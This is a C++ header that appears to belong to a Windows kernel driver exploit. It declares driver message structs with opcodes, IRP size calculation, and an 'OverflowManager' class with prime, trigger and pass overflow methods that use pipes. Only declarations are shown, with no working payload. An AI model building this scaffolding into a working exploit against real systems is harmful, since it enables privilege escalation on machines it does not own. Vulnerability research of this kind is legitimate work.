#pragma once
#include <windows.h>
#include <thread>
#include <iostream>
#include <string>
#include <vector>
#include <stdio.h>
#include <synchapi.h>
#include <winternl.h>
#include<time.h>
#include <algorithm>
#include <vector>
#include <iterator>
#include <ioringapi.h>
#include <psapi.h>
#include "functions.h"
#include <sddl.h>
#include <memory>



struct CreateFileMsg {
	UINT32 opCode = 0xB;
	UINT32 errorCode = 0;
	UINT32 accessMask = GENERIC_READ | SYNCHRONIZE;
	UINT32 shareAccess = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;
	UINT32 padding2 = 0;
	UINT32 fileAttributes = FILE_ATTRIBUTE_NORMAL;
	UINT64 fileHandle = 0;
	WCHAR fileName[260] = { 0 };
};



struct ReadFileMsg {
	UINT32 opCode = 0xC;
	UINT32 errorCode = 0;
	UINT64 fileHandle = 0x0; // 8
	UINT32 bufferLength = 1000; // 16
	UINT32 byteOffset = 0; // 20
	char buffer[1000] = { 'a' };
};

HANDLE GetDeviceHandle();
UINT64 GetFileHandle(HANDLE device, WCHAR* filePath);
void ReadFileHandle(HANDLE device, HANDLE fileHandle, UINT64 chunkSize);


UINT64 CalculateIRPSize(UINT64 chunkSize);


class OverflowManager {
public:

	UINT64 chunkSize;
	bool overflowPrimed;

	SECURITY_ATTRIBUTES securityAttributes;
	PSECURITY_DESCRIPTOR securityDescriptor;

	HANDLE sPipe = NULL;
	HANDLE cPipe = NULL;

	HANDLE driver = NULL;

	std::thread irpThread;

	OverflowManager(HANDLE hDevice);

	void SendIRP();

	void PrimeOverflow(UINT64 chunkSize);
	void TriggerOverflow(BYTE* overflowData, UINT64 overflowSize);
	void PassOverflow();
};
